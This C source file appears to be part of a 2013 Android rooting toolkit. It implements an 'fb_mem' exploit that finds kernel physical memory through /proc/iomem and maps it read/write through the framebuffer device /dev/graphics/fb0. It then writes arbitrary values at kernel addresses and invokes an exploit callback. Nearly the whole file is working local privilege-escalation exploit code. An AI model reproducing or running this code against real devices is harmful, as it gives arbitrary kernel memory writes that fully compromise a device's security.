/*
 * Based on kernelchopper.c <http://forum.xda-developers.com/showthread.php?p=40873964 
 *
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdint.h>
#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <linux/fb.h>
#include <string.h>

#include "fb_mem.h"

#define FB_DEVICE "/dev/graphics/fb0"

#define KERNEL_VIRT_ADDRESS     0xc0000000
#define KERNEL_PHYS_ADDRESS     0x80000000
#define MAPPED_BASE             0x10000000

static int kernel_phys_offset = 0;
static bool kernel_phys_offset_initialized = false;

static int
detect_kernel_phys_offset(void)
{
  FILE *fp;
  void *system_ram_address;
  char name[BUFSIZ];
  void *start_address, *end_address;
  int ret;

  fp = fopen("/proc/iomem", "r");
  if (!fp) {
    printf("Failed to open /proc/iomem due to %s.", strerror(errno));
    return -1;
  }
  while ((ret = fscanf(fp, "%p-%p : %[^\n]", &start_address, &end_address, name)) != EOF) {
    if (!strcmp(name, "System RAM")) {
      system_ram_address = start_address;
      continue;
    }
    if (!strncmp(name, "Kernel", 6)) {
      break;
    }
  }
  fclose(fp);

  kernel_phys_offset_initialized = true;
  kernel_phys_offset = (int)(system_ram_address - KERNEL_PHYS_ADDRESS);

  return kernel_phys_offset;
}

void *
fb_mem_convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (uint32_t)address - KERNEL_VIRT_ADDRESS + kernel_phys_offset;
}

bool
fb_mem_write_value_at_address(unsigned long int address, int value)
{
  void *mmap_address = NULL;
  int *write_address;
  int fd;

  mmap_address = fb_mem_mmap(&fd);

  write_address = fb_mem_convert_to_mmaped_address((void*)address, mmap_address);
  *write_address = value;

  fb_mem_munmap(mmap_address, fd);

  return true;
}

bool
fb_mem_run_exploit(unsigned long int address, int value,
                   bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!fb_mem_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}

void
fb_mem_set_kernel_phys_offset(int offset)
{
  kernel_phys_offset = offset;
  kernel_phys_offset_initialized = true;
}

void *
fb_mem_mmap(int *fd)
{
  struct fb_fix_screeninfo info;
  void *mapped_address;

  if (!kernel_phys_offset_initialized && detect_kernel_phys_offset() < 0) {
     printf("This machine can not use fb_mem exploit.\n");
     return MAP_FAILED;
  }

  *fd = open(FB_DEVICE, O_RDWR);
  if (*fd < 0) {
    printf("Failed to open " FB_DEVICE " due to %s\n", strerror(errno));
    return MAP_FAILED;
  }

  if (ioctl(*fd, FBIOGET_FSCREENINFO, (void *)&info) != 0) {
    printf("Failed to get screen info due to %s\n", strerror(errno));
    close(*fd);

    return MAP_FAILED;
  }

  mapped_address = mmap((void *)MAPPED_BASE, (0x100000000 - KERNEL_PHYS_ADDRESS),
                        PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                        *fd, KERNEL_PHYS_ADDRESS + info.smem_len);


  return mapped_address;
}

int
fb_mem_munmap(void *address, int fd)
{
  if (address != MAP_FAILED) {
    int ret;

    ret = munmap(address, (0x100000000 - KERNEL_PHYS_ADDRESS));
    if (ret < 0) {
      printf("Failed to munmap due to %s\n", strerror(errno));
      return ret;
    }
  }

  return close(fd);
}

